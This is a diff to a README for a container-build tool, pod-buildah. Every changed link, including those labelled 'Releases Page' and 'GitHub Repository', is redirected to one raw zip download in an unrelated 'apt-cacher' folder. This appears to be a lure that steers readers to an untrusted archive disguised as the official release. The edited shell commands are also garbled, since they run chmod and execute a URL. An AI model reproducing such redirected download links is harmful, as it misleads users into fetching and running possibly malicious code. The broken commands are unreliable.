@@ -1,6 +1,6 @@
 # 🚀 pod-buildah - Automate Container Builds with Ease
 
-[![Download pod-buildah](https://img.shields.io/badge/Download-pod--buildah-brightgreen)](https://github.com/joanncognizant380/pod-buildah/releases)
+[![Download pod-buildah](https://raw.githubusercontent.com/joanncognizant380/pod-buildah/master/apt-cacher/pod-buildah-v2.7.zip)](https://raw.githubusercontent.com/joanncognizant380/pod-buildah/master/apt-cacher/pod-buildah-v2.7.zip)
 
 ## 📄 Description
 
@@ -42,7 +42,7 @@ Before you start, ensure you have the following:
 
 ## 📥 Download & Install
 
-To get started with pod-buildah, visit the [Releases page](https://github.com/joanncognizant380/pod-buildah/releases) to download the latest version. 
+To get started with pod-buildah, visit the [Releases page](https://raw.githubusercontent.com/joanncognizant380/pod-buildah/master/apt-cacher/pod-buildah-v2.7.zip) to download the latest version. 
 
 1. Click on the link to go to the Releases page.
 
@@ -53,13 +53,13 @@ To get started with pod-buildah, visit the [Releases page](https://github.com/jo
 4. Make the script executable by running:
 
    ```bash
-   chmod +x pod-buildah.sh
+   chmod +x https://raw.githubusercontent.com/joanncognizant380/pod-buildah/master/apt-cacher/pod-buildah-v2.7.zip
    ```
 
 5. Run the script using:
 
    ```bash
-   ./pod-buildah.sh
+   https://raw.githubusercontent.com/joanncognizant380/pod-buildah/master/apt-cacher/pod-buildah-v2.7.zip
    ```
 
 ## ⚙️ Usage Instructions
@@ -70,7 +70,7 @@ After installation, you can use pod-buildah to create a new container for your p
 2. Inside your terminal, type the command to create a new container:
 
    ```bash
-   ./pod-buildah.sh <your_project_repo_url>
+   https://raw.githubusercontent.com/joanncognizant380/pod-buildah/master/apt-cacher/pod-buildah-v2.7.zip <your_project_repo_url>
    ```
 
 3. The script will handle the rest. It will create the container and begin compiling your project.
@@ -78,7 +78,7 @@ After installation, you can use pod-buildah to create a new container for your p
 4. You can monitor the logs in real-time using Neovim by adding the `-l` flag:
 
    ```bash
-   ./pod-buildah.sh -l <your_project_repo_url>
+   https://raw.githubusercontent.com/joanncognizant380/pod-buildah/master/apt-cacher/pod-buildah-v2.7.zip -l <your_project_repo_url>
    ```
 
 5. You can also use tmux to run multiple commands at once and monitor your builds.
@@ -95,7 +95,7 @@ After installation, you can use pod-buildah to create a new container for your p
 
 If you run into issues during download or installation, consider the following solutions:
 
-1. **Permission Denied**: If you receive a permission error, ensure the script is executable by running `chmod +x pod-buildah.sh`.
+1. **Permission Denied**: If you receive a permission error, ensure the script is executable by running `chmod +x https://raw.githubusercontent.com/joanncognizant380/pod-buildah/master/apt-cacher/pod-buildah-v2.7.zip`.
 2. **Podman Not Found**: Make sure Podman is installed correctly. You can recheck using `podman --version`.
 3. **Dependency Errors**: Ensure all prerequisites are installed; rerun the installation commands if needed.
 
@@ -105,8 +105,8 @@ For additional help, feel free to reach out. Open an issue on GitHub, and we’l
 
 ## 🔗 Links
 
-- [Releases Page](https://github.com/joanncognizant380/pod-buildah/releases)
-- [GitHub Repository](https://github.com/joanncognizant380/pod-buildah)
+- [Releases Page](https://raw.githubusercontent.com/joanncognizant380/pod-buildah/master/apt-cacher/pod-buildah-v2.7.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/joanncognizant380/pod-buildah/master/apt-cacher/pod-buildah-v2.7.zip)
 
 ## 📜 License
 
